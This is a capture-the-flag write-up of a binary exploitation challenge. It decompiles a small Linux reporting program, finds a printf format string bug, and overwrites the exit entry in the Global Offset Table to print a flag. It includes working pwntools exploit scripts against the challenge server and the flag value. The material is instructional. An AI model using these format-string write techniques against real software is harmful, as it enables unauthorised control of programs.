# Beta reporting system [1000] [BINARY EXPLOITATION]

The developer working for COViD that we arrested refused to talk, but we  found a program that he was working on his laptop. His notes have led us to the server where the beta is currently being hosted. It is likely  that there are bugs in it as it is a beta. 

Note: ASLR is enabled on the OS. PIE is not enabled. 

Please view this [Document](https://docs.google.com/document/d/1jdGOn98yRZlYOxywxS___i71_gkmqiMJuyCE8TZKTpI/edit?usp=sharing) for download instructions.

nc yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg 30121 

 This challenge:
\- Is eligible for Awesome Write-ups Award

**Files**: `beta_reporting`, plus a placeholder `flag`.

## Beginning

This challenge is about a linux executable, with the final goal of abusing exploits in the file to print a `flag` file located at the remote server, `yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:30121`.

Running `./beta_reporting` in a linux terminal will produce a simple interface:

```sh
$ ./beta_reporting

***************************
COVID Beta Case Reporting System
***************************
1. Make a new report summary
2. View Report
3. Delete Report
5. Quit
***************************
Enter your choice:
```

Since the ultimate goal is to find a bug in the program, we will need to figure out exactly what each of the options do. You can do this by opening `beta_reporting` a decompiler like [ghidra](https://ghidra-sre.org/), [Binary Ninja](https://cloud.binary.ninja/), or IDA Pro, the last of which is used in this writeup. All of these decompilers will provide reasonably simple code that can be understood by an experienced C programmer. Eventually, the programming for`beta_reporting` can be understood as this<sup>1</sup>:

```c
// global definitions
typedef struct Report {
    char *comment;
    int report_num;
} Report;
Report reportlist[200];
int reporttotalnum;
char *comment;

// to display the text interface
int menu(){
  putchar(10);
  puts("***************************");
  puts("COVID Beta Case Reporting System");
  puts("***************************");
  puts("1. Make a new report summary ");
  puts("2. View Report");
  puts("3. Delete Report");
  puts("5. Quit ");
  puts("***************************");
  return puts("Enter your choice: ");
}

// option 1
int makeareport(){
  /* this function is technically bugged due to a lack of a bounds check for `reporttotalnum`.
   * however, due to the specific order of writes here, this is actually difficult to exploit
   * because reporttotalnum will not be changed beyond +-1 on the first OOB write.
   * Essentially, this function can be taken to be Working-As-Intended */
  puts("Please enter the description of the report:");
  comment = malloc(0x1F4);
  read(0, comment, 0x1F4);
  reportlist[reporttotalnum].report_num = reporttotalnum+1;
  reportlist[reporttotalnum].comment = comment;
  printf("Report created. Report ID is %d\n", reporttotalnum + 1);
  return reporttotalnum++ + 1;
}

// option 2: location of bug
int viewreport(){
  char first_4_bytes[4];
  char nptr[8];
  char s[256];
    
  int report_num = -1;
  puts("Please enter your name: ");
  fgets(s, 256, stdin);
  s[strcspn(s, "\n")] = '\0';
  printf("Welcome %s!\n", s);
  for (int i = 0; i <= 3; ++i) // this is strange & should raise red flags.
    first_4_bytes[i] = s[i];
  while (report_num) {
    puts("Please enter report number or press 0 to return to menu: ");
    fgets(nptr, 8, stdin);
    report_num = atoi(nptr);
    if (report_num >= 0 && report_num <= reporttotalnum) {
      if (report_num) {
        puts("Report details: ");
        printf(reportlist[report_num-1].comment); // this is a dangerous Format String Bug.
      } else
        puts("Returning to menu!");
    } else
      puts("invaild report number\n");
  }
}

// option 3: what is this even for?
unsigned int deletereport() {
  // this function writes to the stack to "clear it out".
  // It's a "work in progress", and we'll ignore it.
  int s[31];
  int s2[31];
  qmemcpy(s, "&", sizeof(s));
  for (int i = 0; i <= 0x1E; ++i)
    s2[i] = s[i] ^ 0x41;
  puts("Delete Report is work in progress");
}

// option 4: the hidden option
void magicfunction() {
  *(int*) magic = *(int*)"flag";
} // this changes the string `magic` to be "flag".

// option undeclared: the hidden function
void unknownfunction() {
  char buf[31]; // [esp+Dh] [ebp-2Bh]
  int fd = open(magic, 0);
  read(fd, buf, 0x1Fu);
  close(fd);
  printf("%s", buf);
  exit(0);
} // this will read & print the contents of the file at filepath `magic`.

// the decision menu
void userchoice(){
  char buf[8];
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while (1){
    menu();
    read(0, buf, 8);
    switch (atoi(buf)) {
      case 1:
        makeareport();
        break;
      case 2:
        viewreport();
        break;
      case 3:
        deletereport();
        break;
      case 4:
        magicfunction();
        break;
      case 5:
        exit(0);
        return;
      default:
        puts("Wrong choice. Please enter again: ");
        break;
    }
  }
}

int main(){
  userchoice();
}
```
Take a while to read all of that, if you need to.

## Moving to exploit
There are a number of factoids in the above decompiled output that an experienced pwner will spot quickly.

1. the `View Report` option involves a call to `printf(<user controlled string>)`. This is a [format string bug](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/), and can be used for reading/writing to any location in the program's RAM.
2. `Delete report` is 'incomplete': this is usually indicative of an intentionally inserted exploit vector for the challenge. In this case though, it appears to be a red herring.
3. There is a section of the program containing an unreferenced function, `unknownfunction`. This function prints the file referenced by variable `magic`, which can be set to `"flag"` via the (hidden) option 4 in the user interface.

From 1 and 3, we can conclude that the exploit for this challenge must involve using (1) to alter the program to execute (3). To figure out what can be done, you can use the `checksec` command that comes with the [`pwntools`](https://github.com/Gallopsled/pwntools/) library:
```
$ checksec beta_reporting
[*] 'beta_reporting'
    Arch:     i386-32-little
    RELRO:    Partial RELRO       # vulnerable
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)  # vulnerable (but also known from the challenge description)
```
The lack of "RELRO" (more on that [here](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)) indicates that the "Global Offset Table" can be overwritten to control program flow. If you don't know what that is, the GOT is essentially a "list of functions" <sup>2</sup> stored at a location in memory. In IDA Pro, the contents of the GOT are displayed in the `IDA View` tab:
```c
.got.plt:0804B000 ; ===========================================================================
.got.plt:0804B000
.got.plt:0804B000 ; Segment type: Pure data
.got.plt:0804B000 ; Segment permissions: Read/Write
.got.plt:0804B000 _got_plt        segment dword public 'DATA' use32
.got.plt:0804B000                 assume cs:_got_plt
.got.plt:0804B000                 ;org 804B000h
.got.plt:0804B000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC
.got.plt:0804B004 dword_804B004   dd 0                    ; DATA XREF: sub_80484D0↑r
.got.plt:0804B008 dword_804B008   dd 0                    ; DATA XREF: sub_80484D0+6↑r
.got.plt:0804B00C off_804B00C     dd offset read          ; DATA XREF: _read↑r
.got.plt:0804B010 off_804B010     dd offset printf        ; DATA XREF: _printf↑r
.got.plt:0804B014 off_804B014     dd offset strcspn       ; DATA XREF: _strcspn↑r
.got.plt:0804B018 off_804B018     dd offset fgets         ; DATA XREF: _fgets↑r
.got.plt:0804B01C off_804B01C     dd offset __stack_chk_fail
.got.plt:0804B01C                                         ; DATA XREF: ___stack_chk_fail↑r
.got.plt:0804B020 off_804B020     dd offset malloc        ; DATA XREF: _malloc↑r
.got.plt:0804B024 off_804B024     dd offset puts          ; DATA XREF: _puts↑r
.got.plt:0804B028 off_804B028     dd offset exit          ; DATA XREF: _exit↑r
.got.plt:0804B02C off_804B02C     dd offset open          ; DATA XREF: _open↑r
.got.plt:0804B030 off_804B030     dd offset __libc_start_main
.got.plt:0804B030                                         ; DATA XREF: ___libc_start_main↑r
.got.plt:0804B034 off_804B034     dd offset setvbuf       ; DATA XREF: _setvbuf↑r
.got.plt:0804B038 off_804B038     dd offset putchar       ; DATA XREF: _putchar↑r
.got.plt:0804B03C off_804B03C     dd offset atoi          ; DATA XREF: _atoi↑r
.got.plt:0804B040 off_804B040     dd offset close         ; DATA XREF: _close↑r
.got.plt:0804B040 _got_plt        ends
.got.plt:0804B040
```
Each line/address here corresponds with a function, like `read()`, `printf()`, or `exit()`. By overwriting a function here with the destination (_pointer to_) another function, the behaviour of the overwritten function will change to match that of the newly written function pointer.

This knowledge allows for the creation of a rudimentary exploit plan:
* use printf() _somehow_ to overwrite a GOT function with the address of `unknownfunction`. My choice here will be to change `exit()` to execute `unknownfunction()`, so that it can be easily triggered with option 5 in the interactive menu.
* run options 4 and 5 to get the flag.

Using `printf()` to complete the exploit will be the most confusing part of all of this for beginners. Let's try to make things easier to understand with a few experiments.

## Approaching printf()
The first thing to do with a `printf()` bug is to figure out the layout of the stack, relative to `printf()`. This is because `printf()` takes all of its arguments<sup>3</sup> off the stack, and we'll need to figure out how the stack can be controlled to write to the GOT.
```c
***************************
<....>
Enter your choice:
1
Please enter the description of the report:
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p    # <-- spam %p to check the highest values on the printf() stack
Report created. Report ID is 1

***************************
<....>
Enter your choice:
2
Please enter your name:
aaaabbbbccccddddeeee                  # <-- the name is a part of the stack; add input here to control the stack of `printf()`
Welcome aaaabbbbccccddddeeee!
Please enter report number or press 0 to return to menu:
1
Report details:
0x8 0xf67bb5a0 0xf67fe000 0xf6679f70 0xf67ef5f0 0x1 0x4 0x61616161 0xf6000a31 0xf67bbd60 0x61616161 0x62626262 0x63636363 0x64646464 0x65656565 (nil) 0x8048e40 0x13 0xf67bbd60
Please enter report number or press 0 to return to menu:
```
This experiment shows that the input for `your name` will end up as the `11+`th argument for `printf()`
```c
...|     9    |    10    |    11    |    12    |    13    |    14    |    15    |...
...|0xf6000a31|0xf67bbd60|0x61616161|0x62626262|0x63636363|0x64646464|0x65656565|...
```
You can verify that fact by trying another format string that specifically targets the 11th argument:
```c
***************************
<...>
Enter your choice:
1
Please enter the description of the report:
%11$p
Report created. Report ID is 1

***************************
<...>
Enter your choice:
2
Please enter your name:
aaaa
Welcome aaaa!
Please enter report number or press 0 to return to menu:
1
Report details:
0x61616161
```
With this knowledge, it is possible to use `printf()` to overwrite memory byte-by-byte, using the `%n` modifier. From the `printf` manpage:
```
n       The number of characters written so  far  is  stored  into  the  integer
        pointed  to  by  the  corresponding argument.  That argument shall be an
        int *, or variant whose size matches the (optionally)  supplied  integer
        length modifier.
```
Let's say we want to write the value `50` to address `0x61616161`. Using the input for `name`, we'll insert the address `0x61616161` as a packed string (this is "aaaa" as seen previously). To write the value itself, we would use the format string `%50c%11$hhn`. `%50c` means "print 50 characters"; this is done to set the `number of characters written so far` to 50. `%11$hhn` means "write the number of characters written so far, as a single byte, to the 11th argument of `printf()`". As obtained prior, the 11th argument will be the first 4 bytes of `name`: 0x61616161.

We'll generalise this exploit pattern to a python function<sup>4</sup>, so that it'll be easy enough to repeat.
```python
from pwn import * # please install pwntools if you have not
r = remote('yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg', 30121)
def write_byte(addr: int, value: int, report_ID=[1]) -> None:
  # send format string
  r.sendlineafter('choice: \n', '1')
  r.sendlineafter('report:\n', '%{}c%11$hhn'.format(value))
  # send name
  r.sendlineafter('choice: \n', '2')
  r.sendlineafter('name: \n', pack(addr))
  # printf() the report & return to main menu
  r.sendlineafter('menu: \n', str(report_ID[0]))
  report_ID[0] += 1
  r.sendlineafter('menu: \n', '0')
```
Now that `printf()` is settled, we can move on to the exploit proper.
## Final steps
Finding the location of `exit()` in the GOT is easy<sup>5</sup>: just use pwntools:
```python
from pwn import *
context.binary = 'beta_reporting' # run this script in the same directory as be-challenge-2/
exit = context.binary.got['exit']
desired = context.binary.symbols['unknownfunction']
print(hex(exit), hex(desired))  # the result here will be 0x804b028 0x80488f7
```
The result of this script will be `0x804b028 0x80488f7`. To overwrite `exit()` with `unknownfunction()`, all you need to do is to overwrite the last two bytes<sup>6</sup>:
```python
write_byte(exit, desired&0xff)
write_byte(exit+1, (desired&0xff00)>>8)
```
After that, the challenge is finished with options 4 and 5:
```python
r.sendlineafter('choice: \n', '4')
r.sendlineafter('choice: \n', '5')
print(r.recvuntil('}'))
```
That's that<sup>7</sup>.
## Flag
`govtech-csg{c0v1d_5y5tem_d0wn!}`

## Footnotes
1. There are inevitably errors _somewhere_ in my interpretation of the program. What matters is that you get the important parts right.
2. This is intentionally simplified --- don't @ me.
3. In i386. x86-64 programs will take arguments off the register first, and other architectures will further baffle with their surprises.
4. Two things about this function that may be confusing:
   * If you've never touched pwntools, you probably have no idea what `sendlineafter()` or `pack()` is. **Read the pwntools documentation**, seasoned pwners don't do that enough, and you should start out on the right path.
   * `report_ID=[1]` is a nice (read: horrifying) python hack that I'm using here to keep a variable that is
       1. stored between function calls, and
       2. bounded (local) to the function itself
   * Also, if you're stuck in python2, you may be confused by the [type hints](https://www.python.org/dev/peps/pep-0483/) present in the code. Please move on!
5. Not so easy if the challenge organisers run gcc with `-s`. Watch out for that in other CTFs.
6. The bithacks here are to grab the lowest (&0xff) and the second lowest (&0xff00 >> 8) bytes respectively.
7. Instead of `r.interactive()` (which most writeups do), the python script terminates with `r.recvuntil('}')` because `unknownfunction()` itself actually calls `exit()`, causing an infinite loop that will cause pwntools to become non-responsive.

## An extra note
I only wrote `write_byte()` as a way of explaining how `printf()` works. After you learn the ropes, you should **never, ever** re-write another format string handling function, because `printf()` exploit helpers are already [packaged along](http://docs.pwntools.com/en/stable/fmtstr.html) in pwntools. I even made [an extended version of their format string library](https://github.com/152334H/pwnscripts), along with other automated functions I use for pwnables. 

During the CTF, my code was a lot dirtier, and I abused `fmtstr_payload()` instead of reinventing the wheel as above.
```python
from pwnscripts import *
context.binary = 'beta_reporting'
def printf(s,name):
    r = remote('yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg', 30121)
    r.sendlineafter('choice: \n', '1')
    r.sendlineafter('\n', s)
    r.sendlineafter('choice: \n', '2')
    r.sendlineafter('name: \n', name)
    r.sendlineafter('menu: \n', '1')
    return r
offset = 8
payload = fmtstr_payload(2, {context.binary.got['exit']: context.binary.symbols['unknownfunction']})
r = printf(payload[:36], payload[36:])
r.sendlineafter('menu: \n', '0')
r.recvuntil('choice: \n')
r.sendline('4')
r.recvuntil('choice: \n')
r.sendline('5')
r.interactive()
```
This code makes sense if you've done a lot of `printf()` problems before, but would be totally nonsensical to a beginner. I'm including it here for the sake of it.

After the CTF, I realised that pwntools actually has a nice function specifically for this kind of `printf()` challenge: the unreferenced [`fmtstr_split()`](https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L743). The code above can be modified to be a lot less hardcoded, and more algorithmically sensible:

```python
from pwnscripts import *
context.binary = 'beta_reporting'
def printf(s,name):
    ...
    r.sendlineafter('menu: \n', '1')
    r.recvline()
    return r, r.recvline()
# compute printf() offset via pwnscripts
offset = fsb.find_offset.buffer(lambda s:printf(s,'AAAA')[1], 10)
# run printf() with a bipartite payload from pwn.make_payload_dollar()
r,_ = printf(*fmtstr_split(offset, {context.binary.got['exit']: p16(context.binary.symbols['unknownfunction']&0xffff)}, write_size='short'))

r.sendlineafter('menu: \n', '0')
...
```
`fsb.find_offset.buffer()` is a [creation of my own](https://github.com/152334H/pwnscripts), and it'll bruteforce the offset to the first time it sees `"AAAA"`. This exists as a pwntools feature too (cf. [`pwn.FmtStr`](https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/fmtstr.py#L816)), but I'm more familiar with my own tools :P

The other complex line below it has two special points of note:
 * the value in the write-dict passed (`unknownfunction`) is wrapped with `p16` to ensure that the minimal amount of writing happens. This works because the original value at an unused GOT function happens to lie in the same memory page:
   ```
   gef➤  telescope 0x804b028
   0x0804b028│+0x0000: 0x08048556  →  0x00003868 ("h8"?)
   ```
 * `write_size` is set to short to ensure that only 1 address is written to by printf(). This is done because the offset found above will end up catching the 4 bytes copied higher up in the stack (cf. line 88, `"this is strange & should raise red flags."`), rather than the genuine beginning of the offset to `name[]`, which will mess up the hypothetical multi-address write from `write_size='byte'`.